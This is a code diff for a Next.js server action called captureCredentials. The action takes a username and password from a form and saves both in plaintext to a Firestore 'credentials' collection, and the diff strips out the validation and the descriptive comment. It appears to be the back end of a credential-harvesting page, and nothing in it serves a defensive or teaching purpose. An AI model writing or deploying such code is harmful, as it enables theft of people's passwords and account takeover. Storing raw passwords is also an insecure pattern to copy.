@@ -1,28 +1,13 @@
 'use server';
-/**
- * @fileOverview A server action to capture user credentials and save them to Firestore.
- */
 
-import { z } from 'zod';
 import { initializeFirebaseServer } from '@/firebase/server';
 import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
-import type { CredentialsInput } from '@/ai/types/credentials';
 
-const CredentialsInputSchema = z.object({
-  username: z.string().describe("The user's email or phone number."),
-  password: z.string().describe("The user's password."),
-});
+export async function captureCredentials(prevState: any, formData: FormData) {
+  const username = formData.get('username') as string;
+  const password = formData.get('password') as string;
 
-type CaptureCredentialsOutput = {
-  success: boolean;
-  message?: string;
-};
-
-export async function captureCredentials(
-  input: CredentialsInput
-): Promise<CaptureCredentialsOutput> {
-  const parsedInput = CredentialsInputSchema.safeParse(input);
-  if (!parsedInput.success) {
+  if (!username || !password) {
     return { success: false, message: 'Invalid input.' };
   }
 
@@ -31,7 +16,8 @@ export async function captureCredentials(
     const credentialsCollection = collection(firestore, 'credentials');
 
     await addDoc(credentialsCollection, {
-      ...parsedInput.data,
+      username,
+      password,
       createdAt: serverTimestamp(),
     });
 
